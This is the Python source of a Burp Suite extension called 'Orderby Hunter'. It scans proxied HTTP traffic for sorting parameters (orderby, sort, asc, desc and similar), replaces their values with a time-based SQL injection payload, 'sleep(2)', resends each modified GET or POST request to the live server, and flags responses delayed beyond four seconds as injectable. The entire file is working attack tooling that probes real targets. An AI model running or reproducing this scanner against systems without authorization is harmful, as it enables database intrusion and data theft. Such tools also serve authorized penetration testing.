#coding=utf-8

import re
import time
import json
from burp import IBurpExtender
from burp import IHttpListener

class BurpExtender(IBurpExtender,IHttpListener):
	def registerExtenderCallbacks(self,callbacks):
		banner = "________            .___          ___.          \n\_____  \_______  __| _/__________\_ |__ ___.__.\n /   |   \_  __ \/ __ |/ __ \_  __ \ __ <   |  |\n/    |    \  | \/ /_/ \  ___/|  | \/ \_\ \___  |\n\_______  /__|  \____ |\___  >__|  |___  / ____|\n        \/           \/    \/          \/\/     \n  ___ ___               __               \n /   |   \ __ __  _____/  |_  ___________ \n/    ~    \  |  \/    \   __\/ __ \_  __ \                                           \n \___|_  /|____/|___|  /__|  \___  >__|   \n       \/            \/          \/       \n                                        author:  automne"
		print(banner)
		self.callbacks = callbacks
		self.helpers = callbacks.getHelpers()
		callbacks.setExtensionName("Orderby Hunter")
		callbacks.registerHttpListener(self)
	
	def processHttpMessage(self,toolFlag,messageIsRequest,messageInfo):
		if toolFlag == self.callbacks.TOOL_PROXY or toolFlag == self.callbacks.TOOL_REPEATER:
			if not messageIsRequest:
				httpService = messageInfo.getHttpService()
				port = httpService.getPort()
				host = httpService.getHost()
				scheme = httpService.getProtocol()
				
				resquest = messageInfo.getRequest()
				resquest_str = self.helpers.bytesToString(resquest)

				analyzedRequest = self.helpers.analyzeRequest(httpService,resquest)
				request_header = analyzedRequest.getHeaders()
				request_url = analyzedRequest.getUrl()
				request_method = analyzedRequest.getMethod()
				request_host, request_uri = self.get_url(request_header)
				request_body = resquest[analyzedRequest.getBodyOffset():].tostring()
				
				response = messageInfo.getResponse()
				analyzedResponse = self.helpers.analyzeResponse(response)
				response_headers = analyzedResponse.getHeaders()

				ishttps = False
				expression = r'.*(443).*'
				if re.match(expression, str(port)):
					ishttps = True
							
				sortKeywords = ["asc","desc","orderby","OrderBy","order","ORDERBY","orderBy","ASC","DESC","Asc","Desc","sortmethod","sort","sortBy"]
				newKeyWords = []
				
				try:
					for param in sortKeywords:
						if request_method == "GET":
							paramname,paramvalue = self.get_parameter(request_uri)
							if param in paramname:
								print "Get paramName request_uri: "+request_uri+"\r\n"
								paramstr = ""
								for j in range(len(paramname)):
									if param == paramname[j]:								
										paramvalue[j] = "sleep(2)"
										paramstr = paramstr + "&" + paramname[j] + "=" + paramvalue[j]
									else:
										paramstr = paramstr + "&" + paramname[j] + "=" + paramvalue[j]					
								new_request_uri = request_uri.split("?")[0]+"?"+paramstr
								new_request_uri = new_request_uri.split("?&")[0]+"?"+new_request_uri.split("?&")[1]

								newRequest_str = "GET "+new_request_uri+" HTTP/1.1\r\n"+"\r\n".join(resquest_str.split("\r\n")[1:-1])
								newRequest = self.helpers.stringToBytes(newRequest_str)
								newAnalyzedRequest = self.helpers.analyzeRequest(newRequest)
								newRequestheader = newAnalyzedRequest.getHeaders()							
								newBody = self.helpers.stringToBytes("") 							
								orderRequest = self.helpers.buildHttpMessage(newRequestheader,newBody)
								
								ts_start = int(round(time.time() * 1000))
								resp = self.callbacks.makeHttpRequest(host, port, ishttps, orderRequest)
								#print self.helpers.bytesToString(resp)
								ts_end = int(round(time.time() * 1000))
								delay = ts_end-ts_start
								if delay > 4000:
									messageInfo.setHighlight('red')
									print "[!] >>>>Get Orderby SQL Injection Targeted<<<< "
									print "\t[+] requestUrl: " + str(request_url)
									print "\t[+] payload: " + new_request_uri + "\r\n"
							elif param in paramvalue:
								print "Get paramValue request_uri: "+request_uri
								for i in range(len(paramvalue)):
									if param in paramvalue[i]:
										newKeyWords.append(paramname[i])
								newKey = set(newKeyWords)-set(sortKeywords)
								with open("newOrderByParams.txt","a") as f:
									for line in newKey:
										f.write(request_uri+":\n")
										f.write(line+"\n")
								print "New Keyword: ["+"".join(newKey)+"] Written in newOrderByParams.txt.\r\n"

						elif request_method == "POST" and param in request_body:
							paramname,paramvalue = self.get_json(request_body)
							if param in paramvalue:
								print "Post paramValue request_uri: "+request_uri
								for i in range(len(paramvalue)):
									if param in paramvalue[i]:
										newKeyWords.append(paramname[i])
								newKey = set(newKeyWords)-set(sortKeywords)
								with open("newOrderByParams.txt","a") as f:
									for line in newKey:
										f.write(request_uri+":\n")
										f.write(line+"\n")
								print "New Keyword: ["+"".join(newKey)+"] has Written in newOrderByParams.txt.\r\n"							
							elif param in paramname:
								print "Post paramName request_uri: "+request_uri
								print "paramName request_body: "+request_body+"\r\n"
								paramstr = ""
								for j in range(len(paramname)):
									if param == paramname[j]:								
										paramvalue[j] = "sleep(2)"
								new_request_body = json.dumps(dict(zip(paramname,paramvalue)))
								newBody = self.helpers.stringToBytes(new_request_body)
								orderRequest = self.helpers.buildHttpMessage(request_header,newBody)
								
								ts_start = int(round(time.time() * 1000))
								resp = self.callbacks.makeHttpRequest(host, port, ishttps, orderRequest)
								ts_end = int(round(time.time() * 1000))
								delay = ts_end-ts_start
								if delay > 4000:
									messageInfo.setHighlight('red')
									print "[!] >>>>Post Orderby SQL Injection Targeted<<<< "
									print "\t[+] requestUrl: " + str(request_url)
									print "\t[+] payload: " + new_request_body + "\r\n"	
									
				except Exception as e:
					pass
				
								
	def get_url(self, rHeaders):
		uri = rHeaders[0].split(' ')[1]
		rHeaders_str = ','.join(rHeaders)
		host = re.search(r'Host: .*,',rHeaders_str,re.M|re.I).group()
		host = host.split(',')[0].split(': ')[1]
		return host, uri
	
	def get_parameter(self,parameter):
		try:
			params = parameter.split("?")[1].split("&")
			pName = []
			pValue = []
			for i in params:
				pName.append(i.split("=")[0])
				pValue.append(i.split("=")[1])
			return pName,pValue
		except Exception as e:
			pass
	
	def get_json(self,jsonstr):
		try:
			jbody = json.loads(jsonstr)
			key = []
			value = []
			for i in jbody:
				key.append(i)
				value.append(jbody[i])			
			return key,value
		except Exception as e:
			pass